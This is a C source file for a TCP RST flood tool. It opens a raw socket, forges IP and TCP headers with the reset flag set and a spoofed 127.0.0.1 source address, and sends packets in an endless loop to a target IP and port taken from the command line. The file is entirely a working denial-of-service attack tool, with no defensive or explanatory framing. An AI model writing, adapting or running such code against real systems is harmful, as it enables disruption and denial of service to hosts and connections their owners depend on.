#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/tcp.h> // TCP header
#include <netinet/ip.h>  // IP header
#include <stdlib.h>
#include <unistd.h>

#define TH_RST 0x04

struct pseudoTCPPacket
{
    __uint32_t src;
    __uint32_t dst;
    __uint8_t zero;
    __uint8_t protocol;
    __uint16_t len;
} tcp_psedohdr;

// Checksum function for IP and TCP headers
unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// Function to send TCP RST flood
void send_rst_flood(char *target_ip, int target_port)
{
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0)
    {
        perror("Socket creation failed");
        exit(1);
    }

    // Set socket option to include the IP header
    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        perror("Error setting IP_HDRINCL");
        exit(1);
    }

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target_port);
    dest.sin_addr.s_addr = inet_addr(target_ip);

    char packet[sizeof(struct tcphdr) + sizeof(struct ip) + 1];
    struct ip *ipheader = (struct ip *)packet;
    struct tcphdr *tcpheader = (struct tcphdr *)(packet + sizeof(struct ip));

    while (1)
    {
        memset(packet, 0, sizeof(packet));

        ipheader->ip_hl = 5;  // Header length in octal number
        ipheader->ip_v = 4;   // AF_INET IPv4
        ipheader->ip_tos = 0; // Type of service
        ipheader->ip_len = htons(sizeof(struct tcphdr) + sizeof(struct ip));
        ipheader->ip_off = 0;         // Fragment offset
        ipheader->ip_ttl = 225;       // Time to live
        ipheader->ip_p = IPPROTO_TCP; // TCP=6, UDP=17
        ipheader->ip_sum = 0;
        ipheader->ip_id = htons(1234); // Just any number
        ipheader->ip_src.s_addr = inet_addr("127.0.0.1");
        ipheader->ip_dst.s_addr = dest.sin_addr.s_addr;

        // tcpheader->th_seq = seq;
        tcpheader->th_ack = htonl(1);
        tcpheader->th_off = 5;                           // IP Header length
        tcpheader->th_flags = TH_RST;                    // We are setting the RST flag
        tcpheader->th_win = htons(4500) + rand() % 1000; // under 9999
        tcpheader->th_urp = 0;                           // Urgent pointer, just leave it as zero.
        tcpheader->th_sport = 6666;
        tcpheader->th_dport = htons(target_port);
        tcpheader->th_sum = 0;

        // Pseudo header for checksum calculation
        tcp_psedohdr.src = ipheader->ip_src.s_addr;
        tcp_psedohdr.dst = ipheader->ip_dst.s_addr;
        tcp_psedohdr.zero = 0;
        tcp_psedohdr.protocol = IPPROTO_TCP; // TCP=6
        tcp_psedohdr.len = htons(sizeof(struct tcphdr));

        int psize = sizeof(tcp_psedohdr) + sizeof(struct tcphdr);
        char *pseudogram = malloc(psize);
        memcpy(pseudogram, (char *)&tcp_psedohdr, sizeof(tcp_psedohdr));
        memcpy(pseudogram + sizeof(tcp_psedohdr), tcpheader, sizeof(struct tcphdr));

        // Calculate checksum
        tcpheader->th_sum = csum((unsigned short *)pseudogram, psize / 2);

        // Send the packet
        if (sendto(sock, packet, ntohs(ipheader->ip_len), 0, (struct sockaddr *)&dest, sizeof(dest)) < 0)
        {
            perror("Packet send error");
        }
        else
        {
            printf("RST Packet Sent\n");
        }

        free(pseudogram);
    }

    close(sock);
}

int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        printf("Usage: %s <target IP> <target port>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);

    send_rst_flood(target_ip, target_port);

    return 0;
}
